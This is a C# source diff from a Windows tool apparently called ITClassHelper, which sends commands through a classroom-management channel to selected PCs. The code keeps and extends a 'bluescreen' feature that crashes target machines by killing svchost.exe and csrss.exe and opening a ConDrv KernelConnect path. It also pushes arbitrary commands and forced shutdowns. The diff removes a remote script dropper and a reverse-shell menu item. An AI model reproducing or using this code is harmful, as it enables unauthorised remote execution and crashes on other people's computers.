@@ -61,7 +61,7 @@ namespace ITClassHelper
                             try
                             {
                                 string hostName = Network.GetHostName(ip);
-                                if (hostName != reply.Address.ToString() && hostName != "ERROR")
+                                if (hostName != reply.Address.ToString() && hostName != null)
                                     DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(hostName);
                                 else
                                     DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add("");
@@ -88,25 +88,24 @@ namespace ITClassHelper
         private void SendCmdMenuItem_Click(object sender, EventArgs e)
         {
             string command = Interaction.InputBox("请输入要发送的命令：", "信息");
-            SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+            RunCommand(command, GetSelectedIPs());
         }
 
         private void SendMsgMenuItem_Click(object sender, EventArgs e)
         {
             string message = Interaction.InputBox("请输入要发送的消息：", "信息");
-            string msgMethod = Interaction.InputBox("请选择发送模式：\n1：原生方法+远程显示（稳定、不引人注意）\n2：原生方法+本地发送（较不稳定、不引人注意）\n3：自带方法+本地发送（只有安装了本软件才可使用此方法）", "信息");
+            string msgMethod = Interaction.InputBox("请选择发送模式：\n1：教室方法+远程显示（稳定）\n2：原生方法+本地发送（较不稳定、不引人注意）\n3：自带方法+本地发送（只有安装了本软件才可使用此方法）", "信息");
             switch (msgMethod)
             {
                 case "1":
-                    SendPack($"msg * {message}", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                    RunCommand($"msg * {message}", GetSelectedIPs());
                     break;
 
                 case "2":
                     foreach (string ip in GetSelectedIPs())
                         Run("msg", $"/server:{Network.GetHostName(ip)} * {message}");
                     break;
-
-                case "3":
+                case "4":
                     try
                     {
                         if (Network.socketBound == false)
@@ -183,67 +182,12 @@ namespace ITClassHelper
                 {
                     foreach (string line in newLines)
                     {
-                        SendPack(line, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                        RunCommand(line, GetSelectedIPs());
                         Thread.Sleep(1000);
                     }
 
                 })
                 { IsBackground = true }.Start();
-            }
-        }
-
-        private void ScripterMenuItem_Click(object sender, EventArgs e)
-        {
-            OpenFileDialog openScriptDialog = new OpenFileDialog
-            {
-                Multiselect = false,
-                Title = "选择脚本文件",
-                Filter = "批处理文件(*.bat)|*.bat|Visual Basic 脚本(*.vbs)|*.vbs"
-            };
-            string openScriptPath = openScriptDialog.FileName;
-            string scriptName = openScriptPath.Substring(openScriptPath.LastIndexOf('\\') + 1);
-            if (openScriptDialog.ShowDialog() == DialogResult.OK)
-            {
-                int lineCnt = 0;
-                using (FileStream lineFs = new FileStream(openScriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
-                {
-                    using (StreamReader lineSr = new StreamReader(lineFs))
-                    {
-                        while (lineSr.ReadLine() != null)
-                            lineCnt++;
-                    }
-                }
-
-                List<string> newLines = new List<string>(lineCnt + 2);
-                using (StreamReader sr = new StreamReader(openScriptPath))
-                {
-                    newLines.Add($@"del /f /q C:\{scriptName}");
-                    string line, newLine = "";
-                    while ((line = sr.ReadLine()) != null)
-                    {
-                        newLine = "echo ";
-                        foreach (char ch in line)
-                        {
-                            if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
-                                newLine += ch;
-                            else
-                                newLine += "^" + ch;
-                        }
-                        newLine += $@" >> C:\{scriptName}";
-                        newLines.Add(newLine);
-                    }
-                    newLines.Add($@"start C:\{scriptName}");
-                }
-
-                new Thread(x =>
-                {
-                    foreach (string line in newLines)
-                    {
-                        SendPack(line, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
-                        Thread.Sleep(1000);
-                    }
-                    
-                }) { IsBackground = true }.Start();
             }
         }
 
@@ -281,7 +225,10 @@ namespace ITClassHelper
                     break;
 
                 case "3":
-                    SendPack("shutdown /s /t 0", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
+                    if (shutdownType == "shutdown")
+                        RunCommand("shutdown /s /t 0", GetSelectedIPs());
+                    else
+                        RunCommand("shutdown /r /t 0", GetSelectedIPs());
                     break;
 
                 default:
@@ -293,7 +240,7 @@ namespace ITClassHelper
         {
             string result;
             result = Network.GetIPAddress(HostNameTextBox.Text);
-            if (result != "ERROR")
+            if (result != null )
                 MessageBox.Show($"目标 IP 地址为：{result}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
             else
                 MessageBox.Show("找不到此计算机！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -303,7 +250,7 @@ namespace ITClassHelper
         {
             string result;
             result = Network.GetIPAddress();
-            if (result != "ERROR")
+            if (result != null)
                 MessageBox.Show($"本机 IP 地址为：{result}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
             else
                 MessageBox.Show("本机 IP 地址获取失败！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -311,20 +258,16 @@ namespace ITClassHelper
 
         private void BluescreenMenuItem_Click(object sender, EventArgs e)
         {
-            string[] commands = new string[4]
+            string[] commands = new string[5]
             {
                 "powershell wininit",
                 "iexplore file://./GlobalRoot/Device/ConDrv/KernelConnect",
+                "chrome file://./GlobalRoot/Device/ConDrv/KernelConnect",
                 "taskkill /f /im svchost.exe",
                 "taskkill /f /im csrss.exe"
             };
             foreach (string command in commands)
-                SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
-        }
-
-        private void RevShellMenuItem_Click(object sender, EventArgs e)
-        {
-            Run(Process.GetCurrentProcess().MainModule.FileName, $"-rs {GetSelectedIPs()[0]}", true);
+                RunCommand(command, GetSelectedIPs());
         }
 
         private void FormDeviceManage_FormClosing(object sender, FormClosingEventArgs e)
